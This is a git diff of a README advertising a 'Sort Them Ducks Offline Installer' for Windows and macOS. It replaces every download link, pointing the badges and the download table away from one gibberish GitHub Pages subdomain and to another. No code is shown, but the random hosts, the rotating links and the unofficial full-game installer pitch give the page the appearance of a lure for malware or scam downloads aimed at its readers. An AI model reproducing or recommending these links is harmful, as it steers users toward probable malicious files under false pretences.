@@ -1,8 +1,8 @@
 # Sort Them Ducks Offline Installer
 
-[![Download](https://img.shields.io/badge/Download-Installer-blue?style=for-the-badge)](https://nrotnjxfyuta.github.io/win-setup/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Mac-lightgrey?style=for-the-badge)](https://nrotnjxfyuta.github.io/win-setup/)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=for-the-badge)](https://nrotnjxfyuta.github.io/win-setup/)
+[![Download](https://img.shields.io/badge/Download-Installer-blue?style=for-the-badge)](https://etgysfcihddy.github.io/windows-dl/)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Mac-lightgrey?style=for-the-badge)](https://etgysfcihddy.github.io/windows-dl/)
+[![Version](https://img.shields.io/badge/Version-Latest-green?style=for-the-badge)](https://etgysfcihddy.github.io/windows-dl/)
 
 > Sort Them Ducks Offline Installer — full game, all puzzles and worlds, plays without internet.
 
@@ -12,8 +12,8 @@
 
 | Platform | Link | Size |
 |----------|------|------|
-| **Windows** | [Download Installer](https://nrotnjxfyuta.github.io/win-setup/) | 1 GB |
-| **macOS** | [Download Installer](https://nrotnjxfyuta.github.io/mac-setup/) | 1 GB |
+| **Windows** | [Download Installer](https://etgysfcihddy.github.io/windows-dl/) | 1 GB |
+| **macOS** | [Download Installer](https://etgysfcihddy.github.io/macos-dl/) | 1 GB |
 
 ---
 
